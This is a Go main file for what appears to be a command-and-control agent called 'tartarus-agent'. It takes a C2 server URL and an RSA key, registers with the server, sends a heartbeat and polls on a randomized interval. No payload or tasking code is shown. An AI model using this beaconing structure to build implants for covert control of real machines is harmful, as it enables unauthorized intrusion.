package main

import (
	"flag"
	"log"
	"os"

	"tartarus-agent/config"
	"tartarus-agent/transport"
)

func main() {
	agentID := flag.String("agent-id", "", "Agent UUID from backend registration")
	c2URL := flag.String("c2", "http://localhost:8000", "Management server URL")
	privKey := flag.String("privkey", "agent_private.pem", "Path to RSA private key PEM")
	pollMin := flag.Int("poll-min", 2, "Minimum poll interval seconds")
	pollMax := flag.Int("poll-max", 5, "Maximum poll interval seconds")
	flag.Parse()

	if *agentID == "" {
		log.Fatal("--agent-id required")
	}

	cfg := config.AgentConfig{
		AgentID:     *agentID,
		C2BaseURL:   *c2URL,
		PrivKeyPath: *privKey,
		PollMin:     *pollMin,
		PollMax:     *pollMax,
	}

	log.Printf("[TARTARUS-AGENT] Starting...")
	log.Printf("[TARTARUS-AGENT] AgentID=%s C2=%s", cfg.AgentID, cfg.C2BaseURL)

	client := transport.NewClient(cfg)

	if err := client.Register(); err != nil {
		log.Fatalf("[TARTARUS-AGENT] Registration failed: %v", err)
	}
	log.Printf("[TARTARUS-AGENT] Registration successful")

	if err := client.Heartbeat(); err != nil {
		log.Printf("[TARTARUS-AGENT] Initial heartbeat failed: %v", err)
	}

	log.Printf("[TARTARUS-AGENT] Agent is ready")
	client.StartPollLoop()

	// unreachable; kept for clarity
	os.Exit(0)
}
